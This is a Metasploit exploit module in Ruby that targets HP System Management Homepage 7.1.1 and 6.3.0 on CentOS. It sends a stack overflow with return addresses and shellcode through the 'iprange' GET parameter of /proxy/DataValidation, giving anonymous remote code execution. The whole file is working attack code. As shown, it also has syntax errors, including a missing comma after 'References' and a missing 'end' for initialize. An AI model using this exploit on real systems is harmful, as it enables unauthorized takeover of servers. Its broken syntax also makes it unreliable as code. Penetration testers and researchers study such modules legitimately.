##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP System Management Anonymous Access Code Execution',
			'Description'    => %q{
					This module exploits an anonymous remote code execution on hp system management 7.1.1 and inferior.
			},
			'Author'         => [ 'agix - @agixid' ],
			'License'        => MSF_LICENSE,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1000,
					'BadChars' => "\x00\x25\x0a\x0b\x0d\x3a\x3b\x09\x0c\x23\x20",
				},
			'Platform'       => ['linux'],
			'Arch'           => ARCH_X86,
			'References'	 =>
				[
					['URL', 'http://bit.ly/YhjikT']
				]
			'Targets'        => [

					[ 'HP System Management 7.1.1 - Linux (CentOS)',
					{
						'Ret' => 0x8054e14, # push esp / ret
						'Offset' => 267
					}
					],
					[ 'HP System Management 6.3.0 - Linux (CentOS)',
					{
						'Ret' => 0x805a547, # push esp / ret
						'Offset' => 267
					}
					]

				],
			'DisclosureDate' => 'Sep 01 2012',
			'DefaultTarget' => 0))

	def exploit
		padding = rand_text(target['Offset'])
		ret = [target['Ret']].pack('V')
		uri = "/proxy/DataValidation"
		iprange = "a-bz"+padding+ret+payload.encoded
		print_status("Sending #{uri.length} bytes payload...")

		res = send_request_cgi({
				'method' => 'GET',
				'uri' => uri,
				'vars_get' => {
        			'iprange' => iprange
    			}
			})
		handler
	end

end
